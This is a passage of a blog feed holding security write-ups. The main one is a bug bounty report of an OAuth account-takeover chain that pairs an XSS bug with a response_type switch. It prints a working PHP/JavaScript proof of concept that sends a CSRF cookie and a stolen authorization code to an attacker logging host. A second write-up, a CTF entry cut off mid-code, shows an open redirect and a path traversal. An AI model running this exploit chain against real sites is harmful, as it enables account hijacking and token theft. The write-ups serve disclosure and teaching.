<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/b501f9f9-57f4-4138-8984-23ea6e981ec9" alt="image" /></p>]]></content><author><name>GitHub User</name><email>your-email@domain.com</email></author><category term="bug-bounty" /><summary type="html"><![CDATA[This is probably the best bug I have ever found on a bug bounty target, consider it impact wise or the coolness of this exploit.]]></summary></entry><entry><title type="html">Account hijack for anyone using Google sign-in with , due to response-type switch + leaking href to XSS on login.redacted.com</title><link href="http://localhost:4000/2023/09/10/Escalating-xss-via-Oauth-Dirty-Dance.html" rel="alternate" type="text/html" title="Account hijack for anyone using Google sign-in with , due to response-type switch + leaking href to XSS on login.redacted.com" /><published>2023-09-10T00:00:00+05:30</published><updated>2023-09-10T00:00:00+05:30</updated><id>http://localhost:4000/2023/09/10/Escalating-xss-via-Oauth-Dirty-Dance</id><content type="html" xml:base="http://localhost:4000/2023/09/10/Escalating-xss-via-Oauth-Dirty-Dance.html"><![CDATA[<p>My friend @testingforbugs reached to out to me , he had a xss in login.redacted.com and wanted to escalate the xss bug impact, cookies were marked as httponly and the main functionalities of the application were on www.redacted.com so the escalation wasn‚Äôt going to be easy here.</p>

<p>Although https://login.redacted.com is really a special domain as it‚Äôs used for signup/login , oauth ,etc so there must be a way to do something impactful.</p>

<p>During that time, I remembered about Frans Rosen‚Äôs research on Oauth https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/ eg: where by changing the response_type from code to code,id_token made the OAuth provider return the oauth token,etc in the hash fragment of the url. If the web server isn‚Äôt configured to handle /  expects the oauth token in a query param  it might return an error page and the oauth token may be remain as it is in the hash fragment. (Checkout for more ways to fail the oauth flow)</p>

<p>Now all the attacker needs is a way to steal that oauth token , Frans talked in detail about various ways which could be used for this, even disclosed some of his findings publically.</p>

<p>https://hackerone.com/reports/1567186
https://gitlab.com/gitlab-org/gitlab/-/issues/362394</p>

<p>Please read the blogpost by Frans Rosen before moving on as everything is explained there in very detail.</p>

<hr />

<p>I clicked on the <code class="language-plaintext highlighter-rouge">Sign in With Google</code> button and it redirect me to this url:</p>

<p>https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?response_type=code&amp;client_id=redacted.apps.googleusercontent.com&amp;redirect_uri=https%3A%2F%2Flogin.redacted.com%2Fservices%2Fauthcallback%2Fgoogle&amp;scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile&amp;state=CAAAAYp-AZqpMDAwMDAwMDAwMDAwMDAwAAAA9A7Smsq1ilccptIRIIzBCN2F6P5AovK47V0DGM22mLSuGzEHuOUy0F4IDVP-KgaLPn_tv2xUnrSWyl46NUDAShQVNysl3bZeZOrFyUU-C0x4DbRnLAPeb7tfpoKlq0V6vJFNPazj6xgsRnKKhVz-WF_i2KRmu9-QueIvAxuLnm8u4c7zsTxGRNMaBgAgr9iHtGJxMsczTGTuRn8lmJaR0jqe_gHo_f_nLbT7arnF59kc&amp;service=lso&amp;o2v=1&amp;flowName=GeneralOAuthFlow</p>

<p>I changed the <code class="language-plaintext highlighter-rouge">response_type</code> to <code class="language-plaintext highlighter-rouge">response_type=code,id_token</code> and now just went with the oauth flow , I was redirected to this page.</p>

<p>https://login.redacted.com/identity/sso/ui/AuthorizationError?ErrorCode=No_Oauth_State&amp;ErrorDescription=State+was+not+sent+back&amp;ProviderId=redacted#state=CAAAAYp-AZqpMDAwMDAwMDAwMDAwMDAwAAAA9A7Smsq1ilccptIRIIzBCN2F6P5AovK47V0DGM22mLSuGzEHuOUy0F4IDVP-KgaLPn_tv2xUnrSWyl46NUDAShQVNysl3bZeZOrFyUU-C0x4DbRnLAPeb7tfpoKlq0V6vJFNPazj6xgsRnKKhVz-WF_i2KRmu9-QueIvAxuLnm8u4c7zsTxGRNMaBgAgr9iHtGJxMsczTGTuRn8lmJaR0jqe_gHo_f_nLbT7arnF59kc&amp;code=4/0Adeu5BUex4YzCBcszdOirTLW_UO0o7O5QXEynHjerek2dUDBLaV2QjPMdkK051x7MOBdzA&amp;scope=email%20profile%20openid%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/userinfo.profile&amp;id_token=eyJhbGciOiJSUzI1NiIsImtpZCI6IjgzOGMwNmM2MjA0NmMyZDk000GFmZmUxMzdkZDUzMTAxMjlmNGQ1ZDEiLCJ0eXAiOiJKV1QifQ.xxxxxx.O2OPIsMtZZzUc4v3zHXPBCL5rfjciDfPqQScixbpsSXdEbgsxpxMhcz5M3P01yFaVsAzxyXY2iK9kT6gaul99FmizlBk9tpTfcmHCTSlYKiVz-JTn0LevJHoaRSy8hrH5u5TTLpes3yC2U6pZrdPPQgFZsHFKa8gE2N9-XKK80IKwyftukCjNSNFLhGnJy92h7P4xADUS353R0v8C1WnL8J7Ha7Ic-2lr9xg0AKDoYdTiKqAL7FfSq6rUCDR9pPzmXkud0GA_Ff0h_CuOhD_loXRP8t0F8rsjNdQEHR2RLllmSfZtFS2jjUFr7AAgyZav6fF7Xga_jzNnDyWzriAo4A&amp;authuser=0&amp;prompt=consent&amp;version_info=CmxfU1ZJX0VLU0Vzc2pBbjRFREdCQWlQMDFCUlVSSVpsOXhSRFk0WjJwYWFFUmplamxqUmxOTWVIVjZYeTFtZUZwV2EzQkJhWFZrY0dKd1pIWmFOV2x6WVRocU4yNHlkVGhRYnpGeVZsTkNWUV8</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://login.redacted.com/identity/sso/ui/AuthorizationError?
ErrorCode=No_Oauth_State
&amp;ErrorDescription=State+was+not+sent+back
&amp;ProviderId=redacted
#state=CAAAAY&amp;code=4/0Ad...&amp;id_token=eyJh..................
</code></pre></div></div>

<p>From the <code class="language-plaintext highlighter-rouge">ErrorDescription</code> you can see the server was expecting a state parameter to be there in the query param but as the hash fragment is there and is only accessible via client side js , as they are in the hash fragment the error is shown.</p>

<p>Now all we need is a way to steal the hash fragment.
As our xss is in the same domain, I can easily read it. All I need is to make some relation between the error page containing code in hash and the xss page.</p>

<hr />

<p>I went ahead and created a poc, which first setups the oauth url with the modified response_type , then opens the xss endpoint in a new tab using javascript‚Äôs window.open (we will refer to this tab as winB), then using window.location I redirected the current page to the oauth url (we will refer this as winA).</p>

<p>The oauth flow takes place and the user is redirected to this url (in winA tab)</p>

<p>https://login.redacted.com/identity/sso/ui/AuthorizationError?ErrorCode=No_Oauth_State&amp;ErrorDescription=State+was+not+sent+back&amp;ProviderId=redacted#state=CAAAAY&amp;code=4/0Ad‚Ä¶&amp;id_token=eyJh‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶</p>

<p>See the origin of winA it‚Äôs login.redacted.com and the origin of winB is also login.redacted.com. As both winA and winB are of same origin, we can read the full url of winA tab. Using window.opener.document.location.hash property from the winB tab where we have xss, I can easily get the necessary paramater values eg: code . An attacker can send this to his server and then login into victim‚Äôs account by just placing the retrieved state and code parameter value in this callback url:</p>

<p>${state} and ${code} are the place holders.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://login.redacted.com/services/authcallback/google?state=${state}&amp;code=${code}&amp;scope=email+profile+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile+openid&amp;authuser=0&amp;prompt=none
</code></pre></div></div>

<p>Now the attacker just needs to make a request to this url and he will be able to login to victim‚Äôs account after following the below steps.</p>

<hr />

<p>I wrote the following php script to do the above steps:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="nv">$url</span> <span class="o">=</span> <span class="s2">"https://login.redacted.com/services/auth/sso/google/"</span><span class="p">;</span>

<span class="nv">$curl</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_HEADER</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

<span class="c1">// The response of this url contains the oauth url in the Location header and the idccsrf cookie from the Set-Cookie header</span>
<span class="nv">$response</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span> <span class="c1">//[1]</span>

<span class="nv">$header_size</span> <span class="o">=</span> <span class="nb">curl_getinfo</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLINFO_HEADER_SIZE</span><span class="p">);</span>
<span class="nv">$headers</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$response</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$header_size</span><span class="p">);</span>
<span class="nv">$body</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$response</span><span class="p">,</span> <span class="nv">$header_size</span><span class="p">);</span>

<span class="nb">curl_close</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>

<span class="nv">$headers</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$headers</span><span class="p">);</span>

<span class="k">foreach</span> <span class="p">(</span><span class="nv">$headers</span> <span class="k">as</span> <span class="nv">$header</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="s1">'Location: '</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$location</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span> <span class="c1">//oauth url is stored here</span>
    <span class="p">}</span>

    <span class="c1"># get set-cookie</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="s1">'Set-Cookie: '</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$cookie</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mi">12</span><span class="p">);</span>  <span class="c1">// idccsrf cookie is stored here</span>
    <span class="p">}</span>
<span class="p">}</span>



<span class="c1">#send this cookie to attacker controlled server https://en2celr7rewbul.m.pipedream.net/steal?q=</span>

<span class="nv">$attackerDomain</span> <span class="o">=</span> <span class="s2">"https://en2celr7oewbxl.m.pipedream.net/steal?q="</span><span class="p">;</span>

<span class="nv">$curl</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$attackerDomain</span> <span class="mf">.</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">));</span>
<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_HEADER</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

<span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span> 



<span class="c1">#replace the response_type parameter value with code,id_token oauthUrl</span>

<span class="nv">$location</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'response_type=code'</span><span class="p">,</span> <span class="s1">'response_type=code,id_token'</span><span class="p">,</span> <span class="nv">$location</span><span class="p">);</span> <span class="c1">// [2]</span>


<span class="cp">?&gt;</span>


<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;script&gt;</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Oauth url: </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$location</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="dl">"</span><span class="p">)</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Cookie: </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$cookie</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="dl">"</span><span class="p">)</span>
        
        <span class="c1">// this is the xss payload which we used to steal the authorization code  </span>

        <span class="nx">payload</span> <span class="o">=</span> <span class="s2">`setTimeout(()=&gt;{fetch("</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$attackerDomain</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="s2">"%2Bescape(window.opener.document.location.hash));alert(window.opener.document.location.hash)},9000)`</span>

        <span class="kd">function</span> <span class="nf">startExploit</span><span class="p">(){</span>
            <span class="c1">// window.open location value, it opens the vulnerable xss endpoint a new window</span>


            <span class="nx">win</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s2">`https://login.redacted.com/xssendpoint?param=shirley')};</span><span class="p">${</span><span class="nx">payload</span><span class="p">}</span><span class="s2">;function%20xyz(){window.parent.postMessage('x`</span><span class="p">);</span>
            <span class="c1">// wait 5 seconds</span>

            <span class="c1">// This opens the oauth url in the current tab</span>

            <span class="nf">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">`</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$location</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="s2">;`</span>
                
            <span class="p">},</span> <span class="mi">5000</span><span class="p">);</span>

            <span class="c1">//great now if I run `window.opener` from the xss page I get the whole token and everything</span>

        <span class="p">}</span>

    <span class="nt">&lt;/script&gt;</span>

    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"#"</span> <span class="na">onclick=</span><span class="s">"startExploit()"</span><span class="nt">&gt;</span>Start Exploit<span class="nt">&lt;/a&gt;</span>
<span class="nt">&lt;/body&gt;</span>
</code></pre></div></div>

<p>This endpoint was responsible for generating the oauth url:</p>

<p><img src="https://github.com/Sudistark/xss-writeups/assets/31372554/c80c6611-6339-478a-8a2f-8bb2cb4d7d0f" alt="BurpSuiteCommunity_xLyg501nml" /></p>

<p>In the response headers you can see this cookie:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-Cookie: idccsrf=-898201194036363428516943317029004569446202656766185;
</code></pre></div></div>

<p>This cookie is really important , while using the the authorization code the server validates if the user‚Äôs cookie <code class="language-plaintext highlighter-rouge">idccsrf</code> matches with the <code class="language-plaintext highlighter-rouge">idccsrf</code> cookie assigned at the time of generating the ouath url.</p>

<p>The above php code does the following thing,makes a request to https://login.redacted.com/services/auth/sso/google/ on line [1], from the header response get the <code class="language-plaintext highlighter-rouge">Location</code> header value and from the <code class="language-plaintext highlighter-rouge">Set-Cookie</code> header get the <code class="language-plaintext highlighter-rouge">idccsrf</code> cookie value.</p>

<p>Then we send the cookie to our logging server so that we can use it later.
On line [2] we modify the <code class="language-plaintext highlighter-rouge">response_type</code> parameter value to <code class="language-plaintext highlighter-rouge">code,id_token</code>.</p>

<p>After that starts javascript code</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">payload</span> <span class="o">=</span> <span class="s2">`setTimeout(()=&gt;{fetch("&lt;?php echo $attackerDomain; ?&gt;"%2Bescape(window.opener.document.location.hash));alert(window.opener.document.location.hash)},9000)`</span>
</code></pre></div></div>

<p>This is the xss payload which we will be using , basically it alerts the 
<code class="language-plaintext highlighter-rouge">window.opener.document.location.hash</code> value after 9sec.</p>

<p>The <code class="language-plaintext highlighter-rouge">startExploit</code> method does the following things which are important for this attack,</p>

<p>This opens the xss endpoint via <code class="language-plaintext highlighter-rouge">window.open</code> refers to this window as winB and the current page as winA (which has all the php code,js code,etc)</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">win</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s2">`https://login.redacted.com/xssendpoint?param=shirley')};</span><span class="p">${</span><span class="nx">payload</span><span class="p">}</span><span class="s2">;function%20xyz(){window.parent.postMessage('x`</span><span class="p">);</span>
</code></pre></div></div>

<p>Then after 5sec , we redirect the winA to the value stored in <code class="language-plaintext highlighter-rouge">$location</code> variable. This variable contains the modified <code class="language-plaintext highlighter-rouge">response_type</code> oauth url.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nf">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">`&lt;?php echo $location; ?&gt;;`</span>
                
            <span class="p">},</span> <span class="mi">5000</span><span class="p">);</span>
</code></pre></div></div>

<p>Now here‚Äôs what will happen, the oauth flow will take place automatically as soon as the url is opened there is no user interaction is involved here where they need to select the google acc, it will automatically sign in the user via their google acc which the victim has previously used.</p>

<p>The winA page url will be like this after the oauth flow is done, a message will be shown on the page that the state param wasn‚Äôt provided:</p>

<p>https://login.redacted.com/identity/sso/ui/AuthorizationError?ErrorCode=No_Oauth_State&amp;ErrorDescription=State+was+not+sent+back&amp;ProviderId=redacted#state=CAAAAY&amp;code=4/0Ad‚Ä¶&amp;id_token=eyJh‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶</p>

<p>The code in winB executes after 9sec (this delay is to make sure the oauth flow takes place properly in the winA tab).
As I already explained winA and winB are of same origin login.redacted.com , we can easily accessed any info for winA window from winB.</p>

<p>winA can be accessed by winB via window.opener property, to get the hash value:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>window.opener.document.location.hash
</code></pre></div></div>

<p>Now onto the next part, once we have stealed the victims authorization code. The above exploit also sends the authorization code and idcsrf cookie to attacker controlled server.</p>

<p>Copy the fragment part which is also displayed in the alert popup and paste it in the <code class="language-plaintext highlighter-rouge">getToken</code> method like I have done in this</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// taken one arguement from commandline</span>


<span class="kd">function</span> <span class="nf">getToken</span><span class="p">(</span><span class="nx">token</span><span class="p">)</span> <span class="p">{</span>

    <span class="c1">//split the params into array</span>

    <span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="nx">token</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">&amp;</span><span class="dl">'</span><span class="p">);</span>

    <span class="c1">//get the value for state param and code param</span>

    <span class="kd">var</span> <span class="nx">state</span> <span class="o">=</span> <span class="nx">params</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">=</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
    <span class="kd">var</span> <span class="nx">code</span> <span class="o">=</span> <span class="nx">params</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">=</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>

    <span class="c1">//console.log(state)</span>
    <span class="c1">//console.log(code)</span>

    <span class="nx">url</span> <span class="o">=</span> <span class="s2">`https://login.redacted.com/services/authcallback/google?state=</span><span class="p">${</span><span class="nx">state</span><span class="p">}</span><span class="s2">&amp;code=</span><span class="p">${</span><span class="nx">code</span><span class="p">}</span><span class="s2">&amp;scope=email+profile+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile+openid&amp;authuser=0&amp;prompt=none`</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="dl">'</span><span class="s1">;</span><span class="dl">'</span><span class="p">,</span> <span class="dl">''</span><span class="p">))</span>




<span class="p">}</span>

<span class="c1">//using this we will generate the correct callback url, just paste your input inside it</span>

<span class="nf">getToken</span><span class="p">(</span><span class="dl">"</span><span class="s2">state=CAAAAY&amp;code=4/0AWtgz&amp;scope=email%20profile%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/userinfo.profile%20openid&amp;id_token=eyJhb.............&amp;authuser=0&amp;prompt=none</span><span class="dl">"</span><span class="p">)</span>
</code></pre></div></div>

<p>The above code will give us the url which can be used now to login into the victim‚Äôs account.There is just one important thing to take care of which is the <code class="language-plaintext highlighter-rouge">idccsrf</code> token at first I didn;t noticed this cookie parameter and was wondering for so long why I wasn‚Äôt able to login to victim‚Äôs acc.</p>

<p>So turn on Burp Intercept and load this url in your browser, add this cookie header which has the idcsrf parameter (you can get this from the server logs). Once you do the following now you can succefully logged in to the victim‚Äôs account.</p>]]></content><author><name>GitHub User</name><email>your-email@domain.com</email></author><category term="bug-bounty" /><summary type="html"><![CDATA[My friend @testingforbugs reached to out to me , he had a xss in login.redacted.com and wanted to escalate the xss bug impact, cookies were marked as httponly and the main functionalities of the application were on www.redacted.com so the escalation wasn‚Äôt going to be easy here.]]></summary></entry><entry><title type="html">Hackthebox Business Ctf Writeup</title><link href="http://localhost:4000/2023/07/18/Hackthebox-Business-CTF-Writeup.html" rel="alternate" type="text/html" title="Hackthebox Business Ctf Writeup" /><published>2023-07-18T00:00:00+05:30</published><updated>2023-07-18T00:00:00+05:30</updated><id>http://localhost:4000/2023/07/18/Hackthebox-Business-CTF-Writeup</id><content type="html" xml:base="http://localhost:4000/2023/07/18/Hackthebox-Business-CTF-Writeup.html"><![CDATA[<h1 id="web-desynth-recruit">Web Desynth Recruit</h1>

<p>Me and my friend (@0xbla) spent our weekend solving a very interesting challenge from HTB Business CTF</p>

<p>The challenge was very realistic and it required you to chain a lot of other bugs to solve it, probably the best one we have ever seen.</p>

<p>I will give you a basic idea about the challenge:</p>

<p>The application had basic login/signup flow
<img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/f0ac9707-b786-423a-8f37-7d04237e3a5f" alt="image" /></p>

<p>Once logged in you were redirect to the <code class="language-plaintext highlighter-rouge">/settings</code> endpoint which allowed you to make changes to your profile: http://localhost:1337/settings</p>

<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/4746400e-81fa-4eba-af17-2f4ea3c4134b" alt="image" /></p>

<p>The Bio input field says that <em>Bio (limited HTML supported)</em> , so we will put some basic html tags and see if they are rendered or not <code class="language-plaintext highlighter-rouge">&lt;i&gt;shirley&lt;/i&gt;</code> , there is also a file upload which only allows to upload png files.
Once we submit this form , we get this message: <em>Your profile is now public</em></p>

<p>We can now visit our profile via this url : http://localhost:1337/profile/3
(The id 1,2 are reserved for other users probably admin)</p>

<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/7ae40860-a2f9-42e0-ae2e-a45b98387d36" alt="image" /></p>

<p>From the above screenshot you could see that the <em>Bio</em> field html code didn‚Äôt worked although it said that basic html tags were allowed. I also tried some more tags but all of them weren‚Äôt rendered.
On the right side you could see we have <em>Report a user</em> functionality where we could report any user profile by just supplying it‚Äôs user id.</p>

<p>Going through burp history , I found this endpoint: http://localhost:1337/go?to=/login
It was found to be vulnerable to open redirect, let‚Äôs add it to our note and move forward with the source code review part.</p>

<hr />

<h1 id="source-code">Source Code</h1>

<p>The application is in python Flask and it is running in debug mode</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">application.main</span> <span class="kn">import</span> <span class="n">app</span>

<span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="sh">'</span><span class="s">0.0.0.0</span><span class="sh">'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">1337</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</code></pre></div></div>

<p>The flag is stored on the file system not exposed anywhere else so we might need a rce and also the location is random.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># change flag name</span>
<span class="nb">mv</span> /flag.txt /flag<span class="si">$(</span><span class="nb">cat</span> /dev/urandom | <span class="nb">tr</span> <span class="nt">-cd</span> <span class="s1">'a-f0-9'</span> | <span class="nb">head</span> <span class="nt">-c</span> 10<span class="si">)</span>.txt
</code></pre></div></div>

<p>The routes are defined here: /application/blueprints/routes.py</p>

<p>We can confirm the open redirect root cause from here:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@web.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/go</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">goto_external_url</span><span class="p">():</span>
    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">to</span><span class="sh">'</span><span class="p">))</span>
</code></pre></div></div>

<p>These one routes which isn‚Äôt allowed to be access by normal user, looked interesting:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@api.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/ipc_download</span><span class="sh">'</span><span class="p">)</span>
<span class="nd">@is_authenticated</span>
<span class="k">def</span> <span class="nf">ipc_download</span><span class="p">(</span><span class="n">user</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span> <span class="o">!=</span> <span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">Unauthorized</span><span class="sh">'</span><span class="p">),</span> <span class="mi">401</span>

    <span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">current_app</span><span class="p">.</span><span class="n">root_path</span><span class="p">,</span> <span class="n">current_app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">"</span><span class="s">UPLOAD_FOLDER</span><span class="sh">"</span><span class="p">])</span><span class="si">}{</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">file</span><span class="sh">"</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
            <span class="n">file_content</span> <span class="o">=</span> <span class="nb">file</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
        <span class="k">return</span> <span class="nc">Response</span><span class="p">(</span><span class="n">file_content</span><span class="p">,</span> <span class="n">mimetype</span><span class="o">=</span><span class="sh">'</span><span class="s">application/octet-stream</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">Something Went Wrong!</span><span class="sh">'</span><span class="p">)</span>


</code></pre></div></div>

<p>This endpoint is responsible for sending the response of the ipc document submitted during profile update but as there is no check on the file param <code class="language-plaintext highlighter-rouge">request.args.get("file")</code> we could path traverse and read any file we want.
We can‚Äôt use this to read the flag directly as the flag has random name suffix to it and also this is only accessible by admin user.</p>

<p>If we want to read the response of this endpoint to read any file we would need a xss bu, which get‚Äôs executed in the bot‚Äôs browser so that we could access this endpoint and read the response.</p>

<p>The Upload IPC endpoint was also interesting:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@api.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/ipc_submit</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="nd">@is_authenticated</span>
<span class="k">def</span> <span class="nf">ipc_submit</span><span class="p">(</span><span class="n">user</span><span class="p">):</span>
    <span class="k">if</span> <span class="sh">'</span><span class="s">file</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">Invalid file!</span><span class="sh">'</span><span class="p">)</span>
    
